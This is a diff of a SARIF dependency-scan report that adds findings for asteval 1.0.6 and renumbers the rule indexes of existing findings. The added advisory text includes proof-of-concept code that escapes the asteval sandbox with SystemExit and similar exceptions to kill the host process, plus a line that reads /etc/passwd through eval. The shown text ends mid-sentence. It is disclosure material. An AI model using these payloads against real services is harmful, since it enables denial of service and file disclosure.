@@ -40,6 +40,15 @@
           },
           "parentIndex": -1,
           "roles": []
+        },
+        {
+          "length": -1,
+          "location": {
+            "index": -1,
+            "uri": "file:///home/runner/work/empathy/empathy/egolint/uv.lock"
+          },
+          "parentIndex": -1,
+          "roles": []
         }
       ],
       "graphs": [],
@@ -1567,6 +1576,42 @@
         },
         {
           "partialFingerprints": {
+            "primaryLocationLineHash": "ceab55d6222118d83bc16e11b8bb2ab5290c8ede01c3120c97230f80e367726c"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/uv.lock"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'asteval@1.0.6' is vulnerable to 'CVE-2026-55244' (also known as 'GHSA-89v8-rhwq-hf77')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-55244",
+          "ruleIndex": 36,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
             "primaryLocationLineHash": "303d396b71b067ae06a50f4aeb83ecccf875522755f15f95d071f361376da587"
           },
           "attachments": [],
@@ -1597,7 +1642,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-16728",
-          "ruleIndex": 36,
+          "ruleIndex": 37,
           "stacks": [],
           "taxa": []
         },
@@ -1633,7 +1678,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-4067",
-          "ruleIndex": 37,
+          "ruleIndex": 38,
           "stacks": [],
           "taxa": []
         },
@@ -1669,7 +1714,43 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48522",
-          "ruleIndex": 38,
+          "ruleIndex": 39,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "acecf951be28201f31a640a1e2b505cbe6f7a3d54e83aed943030043110e8007"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/uv.lock"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'asteval@1.0.6' is vulnerable to 'GHSA-9w56-46f6-3qhx'."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "GHSA-9w56-46f6-3qhx",
+          "ruleIndex": 40,
           "stacks": [],
           "taxa": []
         },
@@ -1705,7 +1786,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-45296",
-          "ruleIndex": 39,
+          "ruleIndex": 41,
           "stacks": [],
           "taxa": []
         },
@@ -1741,7 +1822,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44660",
-          "ruleIndex": 40,
+          "ruleIndex": 42,
           "stacks": [],
           "taxa": []
         },
@@ -1777,7 +1858,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-22150",
-          "ruleIndex": 41,
+          "ruleIndex": 43,
           "stacks": [],
           "taxa": []
         },
@@ -1813,7 +1894,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32875",
-          "ruleIndex": 42,
+          "ruleIndex": 44,
           "stacks": [],
           "taxa": []
         },
@@ -1849,7 +1930,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-47279",
-          "ruleIndex": 43,
+          "ruleIndex": 45,
           "stacks": [],
           "taxa": []
         },
@@ -1885,7 +1966,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-13465",
-          "ruleIndex": 44,
+          "ruleIndex": 46,
           "stacks": [],
           "taxa": []
         },
@@ -1921,7 +2002,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54269",
-          "ruleIndex": 45,
+          "ruleIndex": 47,
           "stacks": [],
           "taxa": []
         },
@@ -1957,7 +2038,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-33750",
-          "ruleIndex": 46,
+          "ruleIndex": 48,
           "stacks": [],
           "taxa": []
         },
@@ -1993,7 +2074,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48524",
-          "ruleIndex": 47,
+          "ruleIndex": 49,
           "stacks": [],
           "taxa": []
         },
@@ -2029,7 +2110,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39373",
-          "ruleIndex": 48,
+          "ruleIndex": 50,
           "stacks": [],
           "taxa": []
         },
@@ -2065,7 +2146,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44292",
-          "ruleIndex": 49,
+          "ruleIndex": 51,
           "stacks": [],
           "taxa": []
         },
@@ -2101,7 +2182,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-6783",
-          "ruleIndex": 50,
+          "ruleIndex": 52,
           "stacks": [],
           "taxa": []
         },
@@ -2137,7 +2218,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-6783",
-          "ruleIndex": 50,
+          "ruleIndex": 52,
           "stacks": [],
           "taxa": []
         },
@@ -2173,7 +2254,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69247",
-          "ruleIndex": 51,
+          "ruleIndex": 53,
           "stacks": [],
           "taxa": []
         },
@@ -2209,7 +2290,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-g7r4-m6w7-qqqr",
-          "ruleIndex": 52,
+          "ruleIndex": 54,
           "stacks": [],
           "taxa": []
         },
@@ -2245,7 +2326,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-11525",
-          "ruleIndex": 53,
+          "ruleIndex": 55,
           "stacks": [],
           "taxa": []
         },
@@ -2281,7 +2362,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22036",
-          "ruleIndex": 54,
+          "ruleIndex": 56,
           "stacks": [],
           "taxa": []
         },
@@ -2317,7 +2398,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-25645",
-          "ruleIndex": 55,
+          "ruleIndex": 57,
           "stacks": [],
           "taxa": []
         },
@@ -2353,7 +2434,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-66418",
-          "ruleIndex": 56,
+          "ruleIndex": 58,
           "stacks": [],
           "taxa": []
         },
@@ -2389,7 +2470,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2024-4068",
-          "ruleIndex": 57,
+          "ruleIndex": 59,
           "stacks": [],
           "taxa": []
         },
@@ -2425,7 +2506,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53550",
-          "ruleIndex": 58,
+          "ruleIndex": 60,
           "stacks": [],
           "taxa": []
         },
@@ -2461,7 +2542,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-67221",
-          "ruleIndex": 59,
+          "ruleIndex": 61,
           "stacks": [],
           "taxa": []
         },
@@ -2497,7 +2578,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32630",
-          "ruleIndex": 60,
+          "ruleIndex": 62,
           "stacks": [],
           "taxa": []
         },
@@ -2533,7 +2614,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-45740",
-          "ruleIndex": 61,
+          "ruleIndex": 63,
           "stacks": [],
           "taxa": []
         },
@@ -2569,7 +2650,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54282",
-          "ruleIndex": 62,
+          "ruleIndex": 64,
           "stacks": [],
           "taxa": []
         },
@@ -2605,7 +2686,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48523",
-          "ruleIndex": 63,
+          "ruleIndex": 65,
           "stacks": [],
           "taxa": []
         },
@@ -2641,7 +2722,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44290",
-          "ruleIndex": 64,
+          "ruleIndex": 66,
           "stacks": [],
           "taxa": []
         },
@@ -2677,7 +2758,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69249",
-          "ruleIndex": 65,
+          "ruleIndex": 67,
           "stacks": [],
           "taxa": []
         },
@@ -2713,7 +2794,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69248",
-          "ruleIndex": 66,
+          "ruleIndex": 68,
           "stacks": [],
           "taxa": []
         },
@@ -2749,7 +2830,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-15157",
-          "ruleIndex": 67,
+          "ruleIndex": 69,
           "stacks": [],
           "taxa": []
         },
@@ -2785,7 +2866,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34073",
-          "ruleIndex": 68,
+          "ruleIndex": 70,
           "stacks": [],
           "taxa": []
         },
@@ -2821,7 +2902,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-28684",
-          "ruleIndex": 69,
+          "ruleIndex": 71,
           "stacks": [],
           "taxa": []
         },
@@ -2857,7 +2938,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-14257",
-          "ruleIndex": 70,
+          "ruleIndex": 72,
           "stacks": [],
           "taxa": []
         },
@@ -2893,7 +2974,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-40347",
-          "ruleIndex": 71,
+          "ruleIndex": 73,
           "stacks": [],
           "taxa": []
         },
@@ -2929,7 +3010,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39892",
-          "ruleIndex": 72,
+          "ruleIndex": 74,
           "stacks": [],
           "taxa": []
         },
@@ -2965,7 +3046,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-9679",
-          "ruleIndex": 73,
+          "ruleIndex": 75,
           "stacks": [],
           "taxa": []
         },
@@ -3001,7 +3082,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44705",
-          "ruleIndex": 74,
+          "ruleIndex": 76,
           "stacks": [],
           "taxa": []
         },
@@ -3037,7 +3118,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-42561",
-          "ruleIndex": 75,
+          "ruleIndex": 77,
           "stacks": [],
           "taxa": []
         },
@@ -3073,7 +3154,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44288",
-          "ruleIndex": 76,
+          "ruleIndex": 78,
           "stacks": [],
           "taxa": []
         },
@@ -3109,7 +3190,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44431",
-          "ruleIndex": 77,
+          "ruleIndex": 79,
           "stacks": [],
           "taxa": []
         },
@@ -3145,7 +3226,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34043",
-          "ruleIndex": 78,
+          "ruleIndex": 80,
           "stacks": [],
           "taxa": []
         },
@@ -3181,7 +3262,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22701",
-          "ruleIndex": 79,
+          "ruleIndex": 81,
           "stacks": [],
           "taxa": []
         },
@@ -3217,7 +3298,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2021-23337",
-          "ruleIndex": 80,
+          "ruleIndex": 82,
           "stacks": [],
           "taxa": []
         },
@@ -3253,7 +3334,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-26007",
-          "ruleIndex": 81,
+          "ruleIndex": 83,
           "stacks": [],
           "taxa": []
         },
@@ -3289,7 +3370,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69152",
-          "ruleIndex": 82,
+          "ruleIndex": 84,
           "stacks": [],
           "taxa": []
         },
@@ -3325,7 +3406,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69152",
-          "ruleIndex": 82,
+          "ruleIndex": 84,
           "stacks": [],
           "taxa": []
         },
@@ -3361,7 +3442,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-16729",
-          "ruleIndex": 83,
+          "ruleIndex": 85,
           "stacks": [],
           "taxa": []
         },
@@ -3397,7 +3478,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "GHSA-v3rj-xjv7-4jmq",
-          "ruleIndex": 84,
+          "ruleIndex": 86,
           "stacks": [],
           "taxa": []
         },
@@ -3433,7 +3514,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41205",
-          "ruleIndex": 85,
+          "ruleIndex": 87,
           "stacks": [],
           "taxa": []
         },
@@ -3469,7 +3550,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-2229",
-          "ruleIndex": 86,
+          "ruleIndex": 88,
           "stacks": [],
           "taxa": []
         },
@@ -3505,7 +3586,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53540",
-          "ruleIndex": 87,
+          "ruleIndex": 89,
           "stacks": [],
           "taxa": []
         },
@@ -3541,7 +3622,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53537",
-          "ruleIndex": 88,
+          "ruleIndex": 90,
           "stacks": [],
           "taxa": []
         },
@@ -3577,7 +3658,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-1526",
-          "ruleIndex": 89,
+          "ruleIndex": 91,
           "stacks": [],
           "taxa": []
         },
@@ -3613,7 +3694,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-12151",
-          "ruleIndex": 90,
+          "ruleIndex": 92,
           "stacks": [],
           "taxa": []
         },
@@ -3649,7 +3730,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41907",
-          "ruleIndex": 91,
+          "ruleIndex": 93,
           "stacks": [],
           "taxa": []
         },
@@ -3685,7 +3766,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41907",
-          "ruleIndex": 91,
+          "ruleIndex": 93,
           "stacks": [],
           "taxa": []
         },
@@ -3721,7 +3802,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2020-7753",
-          "ruleIndex": 92,
+          "ruleIndex": 94,
           "stacks": [],
           "taxa": []
         },
@@ -3757,7 +3838,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48525",
-          "ruleIndex": 93,
+          "ruleIndex": 95,
           "stacks": [],
           "taxa": []
         },
@@ -3793,7 +3874,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-68146",
-          "ruleIndex": 94,
+          "ruleIndex": 96,
           "stacks": [],
           "taxa": []
         },
@@ -3829,7 +3910,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48712",
-          "ruleIndex": 95,
+          "ruleIndex": 97,
           "stacks": [],
           "taxa": []
         },
@@ -3865,7 +3946,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32874",
-          "ruleIndex": 96,
+          "ruleIndex": 98,
           "stacks": [],
           "taxa": []
         },
@@ -3901,7 +3982,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-24486",
-          "ruleIndex": 97,
+          "ruleIndex": 99,
           "stacks": [],
           "taxa": []
         },
@@ -3937,7 +4018,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48818",
-          "ruleIndex": 98,
+          "ruleIndex": 100,
           "stacks": [],
           "taxa": []
         },
@@ -3973,7 +4054,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48817",
-          "ruleIndex": 99,
+          "ruleIndex": 101,
           "stacks": [],
           "taxa": []
         },
@@ -4009,7 +4090,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48526",
-          "ruleIndex": 100,
+          "ruleIndex": 102,
           "stacks": [],
           "taxa": []
         },
@@ -4045,7 +4126,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41242",
-          "ruleIndex": 101,
+          "ruleIndex": 103,
           "stacks": [],
           "taxa": []
         },
@@ -4081,7 +4162,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-13465",
-          "ruleIndex": 44,
+          "ruleIndex": 46,
           "stacks": [],
           "taxa": []
         },
@@ -4117,7 +4198,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-45768",
-          "ruleIndex": 102,
+          "ruleIndex": 104,
           "stacks": [],
           "taxa": []
         },
@@ -4153,7 +4234,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-67221",
-          "ruleIndex": 59,
+          "ruleIndex": 61,
           "stacks": [],
           "taxa": []
         },
@@ -4225,7 +4306,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22701",
-          "ruleIndex": 79,
+          "ruleIndex": 81,
           "stacks": [],
           "taxa": []
         },
@@ -4261,7 +4342,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-68146",
-          "ruleIndex": 94,
+          "ruleIndex": 96,
           "stacks": [],
           "taxa": []
         },
@@ -4297,7 +4378,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44431",
-          "ruleIndex": 77,
+          "ruleIndex": 79,
           "stacks": [],
           "taxa": []
         },
@@ -4369,7 +4450,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48522",
-          "ruleIndex": 38,
+          "ruleIndex": 39,
           "stacks": [],
           "taxa": []
         },
@@ -4405,7 +4486,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48523",
-          "ruleIndex": 63,
+          "ruleIndex": 65,
           "stacks": [],
           "taxa": []
         },
@@ -4441,7 +4522,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48524",
-          "ruleIndex": 47,
+          "ruleIndex": 49,
           "stacks": [],
           "taxa": []
         },
@@ -4477,7 +4558,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48525",
-          "ruleIndex": 93,
+          "ruleIndex": 95,
           "stacks": [],
           "taxa": []
         },
@@ -4513,7 +4594,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48526",
-          "ruleIndex": 100,
+          "ruleIndex": 102,
           "stacks": [],
           "taxa": []
         },
@@ -4585,7 +4666,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-24486",
-          "ruleIndex": 97,
+          "ruleIndex": 99,
           "stacks": [],
           "taxa": []
         },
@@ -4765,7 +4846,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-66418",
-          "ruleIndex": 56,
+          "ruleIndex": 58,
           "stacks": [],
           "taxa": []
         },
@@ -4837,7 +4918,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-31900",
-          "ruleIndex": 103,
+          "ruleIndex": 105,
           "stacks": [],
           "taxa": []
         },
@@ -4909,7 +4990,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-7246",
-          "ruleIndex": 104,
+          "ruleIndex": 106,
           "stacks": [],
           "taxa": []
         },
@@ -4945,7 +5026,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-26007",
-          "ruleIndex": 81,
+          "ruleIndex": 83,
           "stacks": [],
           "taxa": []
         },
@@ -5017,7 +5098,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-28684",
-          "ruleIndex": 69,
+          "ruleIndex": 71,
           "stacks": [],
           "taxa": []
         },
@@ -5053,7 +5134,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-25645",
-          "ruleIndex": 55,
+          "ruleIndex": 57,
           "stacks": [],
           "taxa": []
         },
@@ -5089,7 +5170,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48817",
-          "ruleIndex": 99,
+          "ruleIndex": 101,
           "stacks": [],
           "taxa": []
         },
@@ -5125,7 +5206,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48818",
-          "ruleIndex": 98,
+          "ruleIndex": 100,
           "stacks": [],
           "taxa": []
         },
@@ -5161,7 +5242,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32874",
-          "ruleIndex": 96,
+          "ruleIndex": 98,
           "stacks": [],
           "taxa": []
         },
@@ -5197,7 +5278,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32875",
-          "ruleIndex": 42,
+          "ruleIndex": 44,
           "stacks": [],
           "taxa": []
         },
@@ -5233,7 +5314,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44660",
-          "ruleIndex": 40,
+          "ruleIndex": 42,
           "stacks": [],
           "taxa": []
         },
@@ -5305,7 +5386,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54282",
-          "ruleIndex": 62,
+          "ruleIndex": 64,
           "stacks": [],
           "taxa": []
         },
@@ -5521,7 +5602,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-40347",
-          "ruleIndex": 71,
+          "ruleIndex": 73,
           "stacks": [],
           "taxa": []
         },
@@ -5557,7 +5638,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-42561",
-          "ruleIndex": 75,
+          "ruleIndex": 77,
           "stacks": [],
           "taxa": []
         },
@@ -5593,7 +5674,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53540",
-          "ruleIndex": 87,
+          "ruleIndex": 89,
           "stacks": [],
           "taxa": []
         },
@@ -5629,7 +5710,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53537",
-          "ruleIndex": 88,
+          "ruleIndex": 90,
           "stacks": [],
           "taxa": []
         },
@@ -5665,7 +5746,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34073",
-          "ruleIndex": 68,
+          "ruleIndex": 70,
           "stacks": [],
           "taxa": []
         },
@@ -5701,7 +5782,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69247",
-          "ruleIndex": 51,
+          "ruleIndex": 53,
           "stacks": [],
           "taxa": []
         },
@@ -5737,7 +5818,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69249",
-          "ruleIndex": 65,
+          "ruleIndex": 67,
           "stacks": [],
           "taxa": []
         },
@@ -5773,7 +5854,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69248",
-          "ruleIndex": 66,
+          "ruleIndex": 68,
           "stacks": [],
           "taxa": []
         },
@@ -5809,7 +5890,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39892",
-          "ruleIndex": 72,
+          "ruleIndex": 74,
           "stacks": [],
           "taxa": []
         },
@@ -5845,7 +5926,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39373",
-          "ruleIndex": 48,
+          "ruleIndex": 50,
           "stacks": [],
           "taxa": []
         },
@@ -5881,7 +5962,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41205",
-          "ruleIndex": 85,
+          "ruleIndex": 87,
           "stacks": [],
           "taxa": []
         }
@@ -6783,6 +6864,30 @@
             },
             {
               "deprecatedIds": [
+                "CVE-2026-55244",
+                "GHSA-89v8-rhwq-hf77"
+              ],
+              "fullDescription": {
+                "markdown": "## Summary\n\nAn attacker who can supply expressions to `asteval.Interpreter.eval()` can raise `SystemExit`,\n`KeyboardInterrupt`, `GeneratorExit`, or `BaseException` from inside the sandbox. These\nexceptions are subclasses of `BaseException` but not `Exception`, so they bypass the\n`except Exception:` safety net in both `run()` and `eval()`. The exception propagates\nverbatim to the calling application, terminating the process or disrupting signal and\ncleanup handlers.\n\nThis is distinct from prior vulnerabilities CVE-2025-24359 (format string injection) and\nGHSA-vp47-9734-prjw (AST mutation TOCTOU), both fixed in 1.0.6. This vector is present in\nall versions including 1.0.6 and current HEAD.\n\n---\n\n## Affected Code\n\n**`asteval/astutils.py`, lines 89–108** — `FROM_PY` exposes dangerous classes to sandbox users:\n\n```python\nFROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n           'BaseException',          # ← escapes except Exception:\n           'BufferError', 'BytesWarning',\n           ...\n           'GeneratorExit',          # ← escapes except Exception:\n           ...\n           'KeyboardInterrupt',      # ← escapes except Exception:\n           ...\n           'SystemExit',             # ← escapes except Exception:\n           ...)\n```\n\n**`asteval/asteval.py`, line 322** — `run()` exception handler:\n\n```python\nexcept Exception:                    # ← does NOT catch BaseException subclasses\n    if with_raise and self.expr is not None:\n        self.raise_exception(node, expr=self.expr)\n```\n\n**`asteval/asteval.py`, line 370** — `eval()` exception handler:\n\n```python\nexcept Exception:                    # ← same gap\n    if show_errors and not raise_errors:\n        ...\n```\n\n**`asteval/asteval.py`, line 264** — `raise_exception()` raises the class directly:\n\n```python\nraise exc(self.error_msg)            # ← when exc=SystemExit, escapes both handlers above\n```\n\n---\n\n## Root Cause\n\nPython's exception hierarchy has two distinct branches under `BaseException`:\n\n```\nBaseException\n├── SystemExit          ← NOT caught by except Exception:\n├── KeyboardInterrupt   ← NOT caught by except Exception:\n├── GeneratorExit       ← NOT caught by except Exception:\n└── Exception           ← caught normally\n    ├── RuntimeError\n    ├── ValueError\n    └── ...\n```\n\n`FROM_PY` exposes all four non-`Exception` classes to sandbox users. When a user writes\n`raise SystemExit(\"msg\")`, the `on_raise()` handler calls:\n\n```python\nself.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n```\n\nwhich executes `raise SystemExit(msg)`. This propagates through both `except Exception:`\nguards unchecked and surfaces in the calling application.\n\n---\n\n## Proof of Concept\n\n```python\nfrom asteval import Interpreter\n\n# Variant 1: terminate the process\naeval = Interpreter()\ntry:\n    aeval.eval('raise SystemExit(\"terminated by sandbox user\")')\nexcept SystemExit as e:\n    print(f\"[CONFIRMED] SystemExit escaped: {e.code!r}\")\n\n# Variant 2: disrupt signal/finally handling\naeval = Interpreter()\ntry:\n    aeval.eval('raise KeyboardInterrupt(\"interrupt injected\")')\nexcept KeyboardInterrupt as e:\n    print(f\"[CONFIRMED] KeyboardInterrupt escaped: {str(e)!r}\")\n\n# Variant 3: GeneratorExit\naeval = Interpreter()\ntry:\n    aeval.eval('raise GeneratorExit(\"gen escape\")')\nexcept GeneratorExit as e:\n    print(f\"[CONFIRMED] GeneratorExit escaped: {str(e)!r}\")\n\n# Variant 4: BaseException base class\naeval = Interpreter()\ntry:\n    aeval.eval('raise BaseException(\"base escape\")')\nexcept BaseException as e:\n    if not isinstance(e, Exception):\n        print(f\"[CONFIRMED] BaseException escaped: {str(e)!r}\")\n```\n\n**Output (tested on asteval 1.0.6, Python 3.11/3.12):**\n\n```\n[CONFIRMED] SystemExit escaped: 'terminated by sandbox user'\n[CONFIRMED] KeyboardInterrupt escaped: 'interrupt injected'\n[CONFIRMED] GeneratorExit escaped: 'gen escape'\n[CONFIRMED] BaseException escaped: 'base escape'\n```\n\n### Real-world server scenario\n\n```python\nfrom asteval import Interpreter\n\ndef handle_request(user_expression):\n    aeval = Interpreter()\n    return aeval.eval(user_expression)   # SystemExit propagates here\n\n# Attacker sends: raise SystemExit(1)\n# Application terminates. Top-level except Exception: handlers do not protect it.\ntry:\n    handle_request('raise SystemExit(1)')\nexcept Exception:\n    pass  # \u003c-- does NOT catch SystemExit; process exits\n```\n\n---\n\n## Impact\n\n| Variant | Impact |\n|---------|--------|\n| `SystemExit` | Process terminates; exit code and message attacker-controlled |\n| `KeyboardInterrupt` | Disrupts `finally` blocks, signal handlers, and `KeyboardInterrupt`-aware loops |\n| `GeneratorExit` | Disrupts generator cleanup in calling code |\n| `BaseException` | Generic escape, same propagation |\n\nAny application that:\n- Accepts user-supplied expressions via `asteval`\n- Relies on `except Exception:` at the top level (standard practice)\n- Does not wrap `aeval.eval()` in `except BaseException:` (non-standard, unexpected requirement)\n\n...is vulnerable to attacker-triggered process termination (DoS).\n\nCVSS breakdown: Network-reachable (AV:N), no special conditions (AC:L), no credentials (PR:N),\nno interaction (UI:N), scope unchanged (S:U), no confidentiality/integrity impact (C:N/I:N),\nhigh availability impact — process termination (A:H).\n\n---\n\n## Additional Note: File Read Capability (Acknowledged Limitation)\n\nIndependently of this vulnerability, `asteval` exposes a read-only `open()` wrapper\n(`_open` in `astutils.py`) that allows reading arbitrary files with the permissions of the\ncalling process:\n\n```python\naeval.eval(\"open('/etc/passwd').read()\")   # returns /etc/passwd contents\n```\n\nThis is documented in `doc/motivation.rst` as a known design choice (\"If reading from disk\nmust be forbidden, you will want to overwrite the `open()` function from the symbol table\").\nIt is included here for completeness, not as a separate advisory claim.\n\n---\n\n## Recommended Fix\n\n**Option A — 